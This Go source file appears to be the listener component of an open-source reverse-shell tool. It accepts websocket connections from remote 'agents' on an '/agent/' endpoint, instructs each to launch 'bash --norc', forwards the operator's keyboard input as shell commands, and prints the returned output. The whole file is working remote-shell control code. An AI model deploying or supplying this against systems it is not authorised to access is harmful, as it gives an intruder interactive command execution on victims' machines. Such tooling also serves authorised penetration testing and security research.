package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	"github.com/gorilla/websocket"
	"github.com/maxlaverse/reverse-shell/common"
	"github.com/maxlaverse/reverse-shell/message"
)

type onConnectMaster struct {
	stdinChannel chan []byte
}

func (h onConnectMaster) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	conn, err := common.Upgrader.Upgrade(w, r, nil)
	if err != nil {
		common.Logger.Errorf("Error while upgrading: %s", err)
		return
	}
	log.Printf("New incoming connection: starting a new session")
	m := message.CreateProcess{
		CommandLine: "bash --norc",
	}
	conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))

	var processId string
	done := make(chan bool)
	go func() {
		for {
			select {
			case <-done:
				common.Logger.Debugf("Exiting stdin to conn relay")
				return
			case msg := <-h.stdinChannel:
				m := message.ExecuteCommand{
					Id:      processId,
					Command: msg,
				}
				conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
			}
		}
	}()

	go func() {
		defer conn.Close()
		for {
			_, m, err := conn.ReadMessage()
			if err != nil {
				common.Logger.Debugf("ReadMessage error: %s", err)
				return
			}
			b := message.FromBinary(m)
			switch v := b.(type) {
			case *message.ProcessOutput:
				os.Stdout.Write(v.Data)
			case *message.ProcessCreated:
				log.Printf("New session is named: %s\n", v.Id)
				processId = v.Id
			case *message.ProcessTerminated:
				log.Printf("Session closed: %s\n", v.Id)
				done <- true
				//Stdin should write in neutral channel
				return
			default:
				common.Logger.Debugf("Received an unknown message type: %v", v)
			}
		}
	}()
}

func Listen(port int) error {
	common.Logger.Debugf("Listening to incoming connections from Agents")

	stdinChannel := make(chan []byte)
	go func() {
		for {
			select {
			default:
				var msg = make([]byte, 1024)
				size, err := os.Stdin.Read(msg)
				if err == io.EOF {
					return
				} else if err != nil {
					panic(err)
				} else {
					common.Logger.Debugf("Sending to stdint")
					stdinChannel <- msg[0:size]
				}
			}
		}
	}()

	go http.Handle("/agent/", onConnectMaster{stdinChannel: stdinChannel})
	return http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}
